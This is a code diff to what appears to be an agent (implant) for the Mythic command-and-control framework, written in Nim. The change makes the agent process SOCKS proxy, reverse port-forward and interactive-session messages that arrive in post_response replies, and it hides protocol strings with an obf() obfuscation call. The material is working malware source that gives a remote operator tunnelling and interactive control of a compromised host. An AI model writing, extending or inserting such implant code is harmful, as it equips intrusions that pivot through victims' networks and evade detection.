@@ -968,6 +968,32 @@ proc postResponses*(agent: var Agent) =
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
+      
+      # Process socks messages from post_response reply
+      # Mythic can include socks data in ANY response, not just get_tasking
+      # Without this, socks messages queued during postResponses round-trip are dropped
+      if respJson.hasKey(obf("socks")):
+        let socksMessages = respJson[obf("socks")].getElems()
+        if socksMessages.len > 0:
+          debug "[DEBUG] Processing ", socksMessages.len, " socks message(s) from post_response reply"
+          let responses = handleSocksMessages(socksMessages)
+          for response in responses:
+            agent.taskResponses.add(%*{obf("socks"): [response]})
+      
+      # Process rpfwd messages from post_response reply
+      if respJson.hasKey(obf("rpfwd")):
+        let rpfwdMessages = respJson[obf("rpfwd")].getElems()
+        if rpfwdMessages.len > 0:
+          debug "[DEBUG] Processing ", rpfwdMessages.len, " rpfwd message(s) from post_response reply"
+          agent.processRpfwd(rpfwdMessages)
+      
+      # Process interactive messages from post_response reply
+      if respJson.hasKey(obf("interactive")):
+        let interactiveMessages = respJson[obf("interactive")].getElems()
+        if interactiveMessages.len > 0:
+          debug "[DEBUG] Processing ", interactiveMessages.len, " interactive message(s) from post_response reply"
+          agent.processInteractive(interactiveMessages)
+
     except:
       debug "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()
 
